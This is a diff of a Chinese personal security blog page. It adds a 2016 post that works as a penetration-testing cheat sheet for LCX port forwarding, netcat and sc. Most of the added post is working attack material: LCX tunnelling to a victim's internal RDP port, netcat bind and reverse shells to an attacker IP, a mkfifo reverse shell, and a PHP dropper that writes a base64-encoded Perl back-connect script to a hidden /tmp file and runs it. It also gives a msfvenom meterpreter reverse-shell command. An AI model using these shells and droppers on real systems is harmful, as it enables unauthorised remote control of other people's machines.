@@ -80,6 +80,81 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/07/19/2016/lcx-nc-sc/" title="lcx_nc_sc in Windows &amp; Linux" itemprop="url">lcx_nc_sc in Windows &amp; Linux</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-07-18T16:00:00.000Z" itemprop="datePublished"> 发表于 07-19-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="端口转发神器-LCX"><a href="#端口转发神器-LCX" class="headerlink" title="端口转发神器 LCX"></a>端口转发神器 LCX</h2><p>LCX可以进行端口转发</p>
+<h3 id="内网渗透样例"><a href="#内网渗透样例" class="headerlink" title="内网渗透样例"></a>内网渗透样例</h3><pre><code>原理: ![0](/imgs/windowsLcx/lcx.png)
+Cracker控制的主机A(内外网)开了一个端口映射到Target主机B(仅内网)的3389
+
+由于lcx版本问题, 所以linux和win下并不一样, 具体`help`即可
+</code></pre><h4 id="envirnoment"><a href="#envirnoment" class="headerlink" title="envirnoment"></a>envirnoment</h4><pre><code>attacker --&gt; Linux
+Extranet-port: 2333
+Intranet-port: 6666
+win:         192.168.55.130
+linux:    192.168.55.128
+</code></pre><h4 id="mid-linux-victim-win"><a href="#mid-linux-victim-win" class="headerlink" title="mid-linux victim-win"></a>mid-linux victim-win</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># attacker (Extranet)</span></span><br><span class="line">remmina <span class="comment"># Linux remote desktop client</span></span><br><span class="line"><span class="comment"># middle ware (Extranet &amp; Intranet)</span></span><br><span class="line">./lcx -m 2 -p1 2333 -p2 6666</span><br><span class="line"><span class="comment"># victim (Intranet)</span></span><br><span class="line">Lcx.exe -slave 192.168.55.128 6666 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+<p><img src="/imgs/windowsLcx/attacker.png" alt="1"><br><img src="/imgs/windowsLcx/middle.png" alt="2"><br><img src="/imgs/windowsLcx/victim.png" alt="3"></p>
+<h4 id="mid-win-victim-linux"><a href="#mid-win-victim-linux" class="headerlink" title="mid-win victim-linux"></a>mid-win victim-linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># attacker (Extranet)</span></span><br><span class="line">ssh root@192.168.55.130 -p 2333</span><br><span class="line"><span class="comment"># middle ware (Extranet &amp; Intranet)</span></span><br><span class="line">Lcx.exe -listen 2333 6666</span><br><span class="line"><span class="comment"># victim (Intranet)</span></span><br><span class="line">./lcx -m 3 -h1 192.168.55.130 -p1 6666 -h2 127.0.0.1 -p2 3389</span><br></pre></td></tr></table></figure>
+<p><img src="/imgs/windowsLcx/attacker_2.png" alt="1"><br><img src="/imgs/windowsLcx/middle_2.png" alt="2"><br><img src="/imgs/windowsLcx/victim_2.png" alt="3"></p>
+<h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><h3 id="options"><a href="#options" class="headerlink" title="options"></a>options</h3><p>-i Interval, time delay<br>-C CRLF作为换行<br>-p port<br>-l Listen. Using with -p -s -z<br>-s Source IP<br>-u UDP protocal</p>
+<h3 id="open-shell"><a href="#open-shell" class="headerlink" title="open shell"></a>open shell</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># target(server)</span></span><br><span class="line">.\YourNCPath\nc.exe <span class="_">-l</span> -p 3333 -v <span class="_">-e</span> cmd.exe</span><br><span class="line"><span class="comment"># attacker(client)</span></span><br><span class="line">nc TargetIP 3333</span><br></pre></td></tr></table></figure>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># target(server)</span></span><br><span class="line">nc -lvvp 6666 <span class="_">-e</span> /bin/bash</span><br><span class="line"><span class="comment"># attacker(client)</span></span><br><span class="line">nc TargetIP 6666</span><br></pre></td></tr></table></figure>
+<h3 id="nc-reverse-shell"><a href="#nc-reverse-shell" class="headerlink" title="nc reverse shell"></a>nc reverse shell</h3><p>shell反弹是将attacker作为开放机来进行一个操作, 这样就避免了victim的防护检测(自己往外面的正向连接)<br>0x01. 基础NC反弹(-e)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># attacker(server)</span></span><br><span class="line">nc -lvvp 6666</span><br><span class="line"><span class="comment"># target(client)</span></span><br><span class="line">nc <span class="_">-e</span> /bin/bash AttackerIP 6666</span><br></pre></td></tr></table></figure></p>
+<p>0x02. 本地双端口监听, 一个出一个进<br>本地测试,似乎可以<code>持久化</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># attacker(server)</span></span><br><span class="line">nc -lvvp 6666</span><br><span class="line"><span class="comment"># target(client)</span></span><br><span class="line">rm /tmp/backpipe;</span><br><span class="line">mkfifo /tmp/backpipe;	<span class="comment">#创建管道 一进一出</span></span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.55.1 6666 1&gt;/tmp/backpipe</span><br><span class="line"><span class="comment">#设置读写 stdin:0 stdout:1</span></span><br></pre></td></tr></table></figure></p>
+<p>0x03. PHP编译环境下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123;</span><br><span class="line">    $path = execute(<span class="string">"which $pr"</span>);</span><br><span class="line">    <span class="keyword">return</span> ($path ? $path : $pr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span> </span>&#123;</span><br><span class="line">    $res = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> ($cfe) &#123;</span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">            @exec($cfe, $res);</span><br><span class="line">            $res = join(<span class="string">"\n"</span>, $res);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (function_exists(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">            $res = @shell_exec($cfe);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (function_exists(<span class="string">'system'</span>)) &#123;</span><br><span class="line">            @ob_start();</span><br><span class="line">            @system($cfe);</span><br><span class="line">            $res = @ob_get_contents();</span><br><span class="line">            @ob_end_clean();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (function_exists(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">            @ob_start();</span><br><span class="line">            @passthru($cfe);</span><br><span class="line">            $res = @ob_get_contents();</span><br><span class="line">            @ob_end_clean();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (@is_resource($f = @popen($cfe, <span class="string">"r"</span>))) &#123;</span><br><span class="line">            $res = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">while</span> (!@feof($f)) &#123;</span><br><span class="line">                $res.= @fread($f, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose($f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($fname, $text)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($fp = @fopen($fname, <span class="string">'w'</span>)) &#123;</span><br><span class="line">        @fputs($fp, @base64_decode($text));</span><br><span class="line">        @fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$yourip = <span class="string">"x.x.x.x"</span>;</span><br><span class="line">$yourport = <span class="string">"8000"</span>;</span><br><span class="line">$usedb = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'perl'</span> =&gt; <span class="string">'perl'</span>,</span><br><span class="line">    <span class="string">'c'</span> =&gt; <span class="string">'c'</span></span><br><span class="line">);</span><br><span class="line">$back_connect = <span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span> . <span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span> . <span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span> . <span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span> . <span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span> . <span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span> . <span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;</span><br><span class="line">cf(<span class="string">'/tmp/.bc'</span>, $back_connect);</span><br><span class="line">$res = execute(which(<span class="string">'perl'</span>) . <span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>0x04. msf生成reverse.xx作为反弹(只是其中一个例子)</p>
+<blockquote>
+<p><a href="http://netsec.ws/?p=331" target="_blank" rel="external">NETSEC</a><br>msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</your></your></p>
+</blockquote>
+<h2 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h2><p>这个和Linux中的service挺像的, 具体利用到时候再说吧233<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc &lt;server&gt; [<span class="built_in">command</span>][service name]&lt;option1&gt;&lt;option2&gt;...</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p><a href="http://www.admin10000.com/document/65.html" target="_blank" rel="external">sc.exe-全栈开发者</a><br>sc query     //查询所有服务status<br>sc query service //单个<br>sc qc service # service config<br>    sc start service //example: service apache2.2<br>    sc stop service<br>    sc delete service<br>sc config service start= auto|demand|disabled<br>// example: sc config apache2.2 start= demand，将apache设置为手动启动。<code>start=后面有一个空格</code></p>
+</blockquote>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://wrfly.kfd.me/linux-lcx/" target="_blank" rel="external">Linux Lcx</a><br><a href="http://www.secpulse.com/archives/6341.html" target="_blank" rel="external">LCX端口转发-51CTO</a><br><a href="http://www.oschina.net/translate/linux-netcat-command" target="_blank" rel="external">NetCat-OSChina</a><br><a href="http://man.linuxde.net/nc_netcat" target="_blank" rel="external">nc-linuxde</a><br><a href="https://jkeohan.wordpress.com/2010/04/30/using-netcat-to-spawn-a-remote-shell/" target="_blank" rel="external">nc-jkeohan</a><br><a href="http://www.oschina.net/translate/linux-netcat-command?p=1#comments" target="_blank" rel="external">LinuxNC-oschina</a><br><a href="https://www.91ri.org/9367.html?yundun=240666326ef9041d5f17" target="_blank" rel="external">shell-91ri</a><br><a href="http://www.admin10000.com/document/65.html" target="_blank" rel="external">sc.exe-全栈开发者</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/07/19/2016/lcx-nc-sc/#comments" class="ds-thread-count comments-count-link" data-thread-key="07/19/2016/lcx-nc-sc/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/07/07/2016/dns-soa/" title="DNS SOA NS记录" itemprop="url">DNS SOA NS记录</a>
   </h1>
   <p class="article-author">By
@@ -650,69 +725,6 @@
 
 
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/05/08/2016/linux-soft-cheat/" title="Linux佳软推荐_Cheat" itemprop="url">Linux佳软推荐_Cheat</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2016-05-07T16:00:00.000Z" itemprop="datePublished"> 发表于 05-08-2016</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://linux.cn/article-3760-1.html" target="_blank" rel="external">Cheat—— 给Linux初学者和管理员一个终极命令行”备忘单”</a></p>
-<h3 id="Introduce"><a href="#Introduce" class="headerlink" title="Introduce"></a>Introduce</h3><p>比Man精简,实例操作,妈妈再也不怕我不会bash了!</p>
-<h3 id="Enviornment"><a href="#Enviornment" class="headerlink" title="Enviornment"></a>Enviornment</h3><blockquote>
-<p>—In Ubuntu 16.04—<br>sudo apt install git<br>sudo apt install python-pip<br>sudo pip install docopt pygments</p>
-</blockquote>
-<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><blockquote>
-<p>git clone <a href="https://github.com/chrisallenlane/cheat.git" target="_blank" rel="external">https://github.com/chrisallenlane/cheat.git</a><br>cd cheat<br>sudo python setup.py install</p>
-</blockquote>
-<h3 id="Option"><a href="#Option" class="headerlink" title="Option"></a>Option</h3><p>Edit: ~/.bashrc</p>
-<blockquote>
-<p>export EDITOR = /usr/bin/vim(一个你喜欢的编辑器)<br>语法高亮:export CHEATCOLOR=true(我设置了好像没什么用..)</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
-<h3 id="创建备忘单"><a href="#创建备忘单" class="headerlink" title="创建备忘单"></a>创建备忘单</h3><p>cheat备忘单的内容保存在<code>~/.cheat/.</code>目录里</p>
-<blockquote>
-<p>cheat -e -xyz</p>
-</blockquote>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/05/08/2016/linux-soft-cheat/#comments" class="ds-thread-count comments-count-link" data-thread-key="05/08/2016/linux-soft-cheat/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
 
   <nav id="page-nav" class="clearfix">
     <a class="extend prev" rel="prev" href="/"><span></span>Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">Next<span></span></a>
@@ -729,7 +741,7 @@
   <div class="tagcloudlist">
     <p class="asidetitle">标签云</p>
     <div class="tagcloudlist clearfix">
-       <a href="/tags/CodeIgniter/" style="font-size: 10px;">CodeIgniter</a> <a href="/tags/Device/" style="font-size: 13.75px;">Device</a> <a href="/tags/English/" style="font-size: 10px;">English</a> <a href="/tags/G4W/" style="font-size: 10px;">G4W</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/JavaScript/" style="font-size: 20px;">JavaScript</a> <a href="/tags/Kali/" style="font-size: 12.5px;">Kali</a> <a href="/tags/Linux/" style="font-size: 18.75px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/SQLInjection/" style="font-size: 11.25px;">SQLInjection</a> <a href="/tags/Shell/" style="font-size: 13.75px;">Shell</a> <a href="/tags/XSS/" style="font-size: 17.5px;">XSS</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/daily/" style="font-size: 15px;">daily</a> <a href="/tags/dns/" style="font-size: 10px;">dns</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hard/" style="font-size: 12.5px;">hard</a> <a href="/tags/intranet/" style="font-size: 10px;">intranet</a> <a href="/tags/nexus5x/" style="font-size: 12.5px;">nexus5x</a> <a href="/tags/port/" style="font-size: 10px;">port</a> <a href="/tags/soft/" style="font-size: 11.25px;">soft</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/书记/" style="font-size: 16.25px;">书记</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a> <a href="/tags/闲谈/" style="font-size: 12.5px;">闲谈</a>
+       <a href="/tags/CodeIgniter/" style="font-size: 11.25px;">CodeIgniter</a> <a href="/tags/Device/" style="font-size: 13.75px;">Device</a> <a href="/tags/English/" style="font-size: 10px;">English</a> <a href="/tags/G4W/" style="font-size: 10px;">G4W</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/JavaScript/" style="font-size: 20px;">JavaScript</a> <a href="/tags/Kali/" style="font-size: 12.5px;">Kali</a> <a href="/tags/Linux/" style="font-size: 18.75px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/SQLInjection/" style="font-size: 11.25px;">SQLInjection</a> <a href="/tags/Shell/" style="font-size: 13.75px;">Shell</a> <a href="/tags/XSS/" style="font-size: 17.5px;">XSS</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/daily/" style="font-size: 15px;">daily</a> <a href="/tags/dns/" style="font-size: 10px;">dns</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hard/" style="font-size: 12.5px;">hard</a> <a href="/tags/intranet/" style="font-size: 10px;">intranet</a> <a href="/tags/nexus5x/" style="font-size: 12.5px;">nexus5x</a> <a href="/tags/port/" style="font-size: 10px;">port</a> <a href="/tags/soft/" style="font-size: 11.25px;">soft</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/书记/" style="font-size: 16.25px;">书记</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a> <a href="/tags/闲谈/" style="font-size: 12.5px;">闲谈</a>
     </div>
   </div>
 
@@ -737,7 +749,7 @@
   
   <div class="archiveslist">
     <p class="asidetitle"><a href="/archives">归档</a></p>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">九月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">九月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
   </div>
 
 
